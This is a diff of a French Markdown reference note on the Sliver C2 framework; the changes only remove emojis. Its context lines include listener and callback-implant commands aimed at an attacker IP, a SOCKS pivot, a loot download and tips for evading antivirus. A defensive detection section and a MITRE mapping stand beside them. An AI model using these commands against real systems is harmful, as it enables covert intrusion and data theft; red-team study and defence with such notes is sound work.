@@ -1,11 +1,11 @@
 ---
 title: "Outil - Sliver"
 type: outil
-categorie: 🕹️ C2 & Post-Exploitation
+categorie: C2 & Post-Exploitation
 tags:
   - cyber
   - outil
-  - 🕹️ C2 & Post-Exploitation
+  - C2 & Post-Exploitation
 statut: publie
 version: v1.7.5
 licence: GPL-3.0
@@ -16,14 +16,14 @@ site: https://sliver.sh/
 doc: https://sliver.sh/docs
 ---
 
-# 🕹️ Sliver — C2 & Post-Exploitation
+# Sliver — C2 & Post-Exploitation
 
 > [!info] **En 1 phrase**
 > Sliver est un framework C2 open-source écrit en Go, pensé comme un remplaçant moderne de Cobalt Strike : implants compilés, listeners HTTPS/DNS/mTLS/WireGuard, sessions/beacons et post-exploitation extensible.
 
 ---
 
-## 🧾 Overview
+## Overview
 
 | Champ | Détail |
 |---|---|
@@ -39,7 +39,7 @@ doc: https://sliver.sh/docs
 
 ---
 
-## 🎯 Concept
+## Concept
 
 Sliver sert à générer des **implants** (agents compilés nativement en Go) et à contrôler des **sessions** à distance via un serveur de commande & contrôle. Contrairement à Metasploit, il n'exploite pas de vulnérabilités : il est utilisé après une compromission initiale (dropper, phishing, serveur d'exploitation) pour obtenir un accès fiable et difficile à détecter.
 
@@ -57,7 +57,7 @@ flowchart LR
 
 ---
 
-## 🧠 Concepts fondamentaux
+## Concepts fondamentaux
 
 | Concept | Explication |
 |---|---|
@@ -74,7 +74,7 @@ flowchart LR
 
 ---
 
-## 🛠️ Installation
+## Installation
 
 ### Linux / macOS
 
@@ -98,14 +98,14 @@ sliver                          # ouvre le client connecté au serveur local
 .\sliver-server_windows.exe
 ```
 
-> [!warning] ⚠️ Prérequis & problèmes potentiels
+> [!warning] Prérequis & problèmes potentiels
 > - Le premier lancement du server génère une **clé d'opérateur** et une paire de certificats : les conserver précieusement.
 > - L'installation du service système nécessite des droits administrateur.
 > - Les commandes `generate` produisent de gros binaires (Go) : un implant Windows peut dépasser 10 Mo avant compilation avec `-e` (obfuscation).
 
 ---
 
-## ⚙️ Configuration
+## Configuration
 
 La configuration se fait principalement dans la console client : choix du protocole C2, génération des implants, démarrage des listeners.
 
@@ -121,7 +121,7 @@ La configuration se fait principalement dans la console client : choix du protoc
 
 ---
 
-## 🏗️ Architecture interne
+## Architecture interne
 
 Le `sliver-server` (Go) expose une API gRPC locale (et en réseau via les clés d'opérateur). Le client `sliver` est un front-end de cette API. Les implants sont compilés dynamiquement par le server (Go cross-compilation) selon les options demandées : protocole, plateforme, format (exe, shared, raw, service), évasion.
 
@@ -146,7 +146,7 @@ flowchart TB
 
 ---
 
-## ⌨️ Commandes
+## Commandes
 
 ### Commandes principales
 
@@ -167,7 +167,7 @@ flowchart TB
 
 ---
 
-## 🎚️ Options et flags
+## Options et flags
 
 | Option | Description | Exemple | Niveau |
 |---|---|---|---|
@@ -192,7 +192,7 @@ flowchart TB
 
 ---
 
-## 🧪 Exemples pratiques
+## Exemples pratiques
 
 ### Beginner
 
@@ -241,7 +241,7 @@ socks5 start --host 127.0.0.1 --port 1080   # proxychains nmap -sT -Pn 10.10.20.
 
 ---
 
-## 🧪 Workflow complet (scénario pas à pas)
+## Workflow complet (scénario pas à pas)
 
 1. **Étape 1 — Lancer le serveur** : `sliver` (premier lancement → clé d'opérateur générée, à conserver pour les clients distants).
 2. **Étape 2 — Démarrer les listeners** : `listeners --mtls 10.10.14.5:8888 --https 10.10.14.5:443`.
@@ -252,7 +252,7 @@ socks5 start --host 127.0.0.1 --port 1080   # proxychains nmap -sT -Pn 10.10.20.
 
 ---
 
-## 🎬 Scénarios avancés
+## Scénarios avancés
 
 ### Scénario 1 : C2 discret avec beacons et WireGuard
 
@@ -297,7 +297,7 @@ download /tmp/results.json ./loot/
 
 ---
 
-## 🛡️ Cybersecurity use cases
+## Cybersecurity use cases
 
 | Phase | Utilisation |
 |---|---|
@@ -309,7 +309,7 @@ download /tmp/results.json ./loot/
 
 ---
 
-## 🎯 MITRE ATT&CK
+## MITRE ATT&CK
 
 | Tactique | Technique / Sub-technique | ID | Raison | Détection | Mitigation |
 |---|---|---|---|---|---|
@@ -327,7 +327,7 @@ download /tmp/results.json ./loot/
 
 ---
 
-## 🛡️ Defensive Security
+## Defensive Security
 
 ### Signes observables
 
@@ -379,7 +379,7 @@ rule Sliver_Go_binary_example {
 
 ---
 
-## 🤖 Automatisation
+## Automatisation
 
 Sliver peut être piloté par scripts via **sliver-py** (client Python de l'API gRPC) : génération d'implants, gestion de sessions et exécution de commandes de façon reproductible.
 
@@ -400,7 +400,7 @@ pip install sliver-py
 
 ---
 
-## 📤 Output et parsing
+## Output et parsing
 
 Les commandes Sliver renvoient des sorties texte structurées dans la console ; sliver-py expose des objets JSON sérialisables parsables par scripts.
 
@@ -417,28 +417,28 @@ sliver --json sessions
 
 ---
 
-## 🔗 Intégrations
+## Intégrations
 
 ```text
 Compromission initiale → implant Sliver → session/beacon → post-exploitation → pivot
 Sliver ↔ Metasploit (msf) ↔ extensions (Mimikatz, SharpHound) ↔ armory (plugins)
 ```
 
-- [[Tools|🧰 Outils]]
-- [[Outil - Metasploit|🎯 Metasploit]]
-- [[Outil - Ligolo-ng|🔗 Ligolo-ng]]
-- [[Outil - Chisel|⛏️ Chisel]]
-- [[Outil - Covenant|🐉 Covenant]]
-- [[Outil - Havoc|👹 Havoc]]
-- [[Outil - Mythic|🐍 Mythic]]
-- [[Outil - PowerShell Empire|💥 PowerShell Empire]]
-- [[Outil - Mimikatz|🐱 Mimikatz]]
-- [[Techniques/Pivoting et Tunneling|🌉 Pivoting et Tunneling]]
-- [[Techniques/Reverse Shells|🐚 Reverse Shells]]
+- [[Tools| Outils]]
+- [[Outil - Metasploit| Metasploit]]
+- [[Outil - Ligolo-ng| Ligolo-ng]]
+- [[Outil - Chisel| Chisel]]
+- [[Outil - Covenant| Covenant]]
+- [[Outil - Havoc| Havoc]]
+- [[Outil - Mythic| Mythic]]
+- [[Outil - PowerShell Empire| PowerShell Empire]]
+- [[Outil - Mimikatz| Mimikatz]]
+- [[Techniques/Pivoting et Tunneling| Pivoting et Tunneling]]
+- [[Techniques/Reverse Shells| Reverse Shells]]
 
 ---
 
-## 🔄 Alternatives
+## Alternatives
 
 | Outil | Avantages | Inconvénients | Cas d'usage |
 |---|---|---|---|
@@ -453,7 +453,7 @@ Sliver ↔ Metasploit (msf) ↔ extensions (Mimikatz, SharpHound) ↔ armory (pl
 
 ---
 
-## ⚡ Performance
+## Performance
 
 - Implants Go statiques : chargement rapide, aucune dépendance à l'environnement cible (pas de .NET ni de Python requis).
 - Beacons : trafic réseau minimal et régulier (intervalle + jitter configurables) ; le server Go gère de nombreuses sessions concurrentes.
@@ -461,7 +461,7 @@ Sliver ↔ Metasploit (msf) ↔ extensions (Mimikatz, SharpHound) ↔ armory (pl
 
 ---
 
-## 🛠️ Troubleshooting
+## Troubleshooting
 
 ### Common problems
 
@@ -491,7 +491,7 @@ Sliver ↔ Metasploit (msf) ↔ extensions (Mimikatz, SharpHound) ↔ armory (pl
 
 ---
 
-## 🔐 Sécurité de l'outil
+## Sécurité de l'outil
 
 - **Chiffrement** : mTLS (certificats générés par le server), WireGuard (interface `wg0`) et TLS pour HTTP(S) : trafic C2 chiffré par défaut.
 - **Authentification** : les opérateurs s'authentifient par clés X25519 ; protéger les fichiers de clés (`.sliver-client`, `.sliver`).
@@ -501,7 +501,7 @@ Sliver ↔ Metasploit (msf) ↔ extensions (Mimikatz, SharpHound) ↔ armory (pl
 
 ---
 
-## ⚠️ Limitations
+## Limitations
 
 - N'exploite pas de vulnérabilités : nécessite une compromission initiale (dropper, phishing, serveur d'exploitation).
 - Binaires volumineux (Go) : l'implant de base peut être lourd pour des contextes d'injection restreints.
@@ -511,7 +511,7 @@ Sliver ↔ Metasploit (msf) ↔ extensions (Mimikatz, SharpHound) ↔ armory (pl
 
 ---
 
-## 📋 Cheatsheet
+## Cheatsheet
 
 ```bash
 # Server + client
@@ -536,7 +536,7 @@ kill-session <id> ; jobs
 
 ---
 
-## ⚡ Quick reference
+## Quick reference
 
 | | |
 |---|---|
@@ -545,13 +545,13 @@ kill-session <id> ; jobs
 | **Commande principale** | `sliver` → `generate --mtls <ip:port> --os windows` → `sessions` |
 | **Alternative principale** | Cobalt Strike (mature, commercial) ou Empire (PowerShell) |
 | **Concepts importants** | Implant, beacon, session, listener, opérateur, pivot, armory |
-| **Liens associés** | [[Outil - Metasploit\|🎯 Metasploit]] · [[Outil - Ligolo-ng\|🔗 Ligolo-ng]] · [[Outil - Chisel\|⛏️ Chisel]] |
+| **Liens associés** | [[Outil - Metasploit\| Metasploit]] · [[Outil - Ligolo-ng\| Ligolo-ng]] · [[Outil - Chisel\| Chisel]] |
 
 ---
 
-## 🔍 Détection & Défense
+## Détection & Défense
 
-> Les signes observables, règles Sigma/Suricata/YARA et défenses détaillées figurent dans la section **🛡️ Defensive Security** ci-dessus.
+> Les signes observables, règles Sigma/Suricata/YARA et défenses détaillées figurent dans la section **Defensive Security** ci-dessus.
 
 | Rapide | Réponse |
 |---|---|
@@ -561,15 +561,15 @@ kill-session <id> ; jobs
 
 ---
 
-## ⚠️ Tips & Pièges
+## Tips & Pièges
 
-> [!tip] 💡 **Tips**
+> [!tip] **Tips**
 > - Utilise des **beacons** plutôt que des sessions continues pour un C2 discret : trafic régulier faible (configurable via `--interval`/`--jitter`).
 > - Combine `-e` (obfuscation) et `--skip-symbols` pour réduire la détection AV statique.
 > - Garde précieusement la clé d'opérateur générée au premier lancement : elle est nécessaire pour reconnecter des clients distants.
 > - Utilise `--save` pour contrôler où sont écrits les binaires et éviter de les mélanger aux fichiers de config.
 
-> [!warning] ⚠️ **Pièges**
+> [!warning] **Pièges**
 > - Ne lance jamais `generate` sans connaître la plateforme et l'arch de la cible : un implant Windows sur une VM Linux ne répondra jamais.
 > - L'IP du listener doit être celle vue par la cible (`--mtls <IP>` = IP VPN de l'attaquant, pas `localhost`).
 > - Sliver n'exploite pas de vulnérabilités : il faut une compromission initiale (dropper, phishing) pour livrer l'implant.
@@ -577,7 +577,7 @@ kill-session <id> ; jobs
 
 ---
 
-## 📚 References
+## References
 
 ### Official
 
@@ -597,4 +597,4 @@ kill-session <id> ; jobs
 
 ---
 
-➡️ **Liens :** [[Tools|🧰 Outils]] · [[Techniques/Pivoting et Tunneling|🌉 Pivoting et Tunneling]] · [[Techniques/Reverse Shells|🐚 Reverse Shells]] · [[Techniques/Privilege Escalation Windows|⬆️ PrivEsc Windows]]
+**Liens :** [[Tools| Outils]] · [[Techniques/Pivoting et Tunneling| Pivoting et Tunneling]] · [[Techniques/Reverse Shells| Reverse Shells]] · [[Techniques/Privilege Escalation Windows| PrivEsc Windows]]
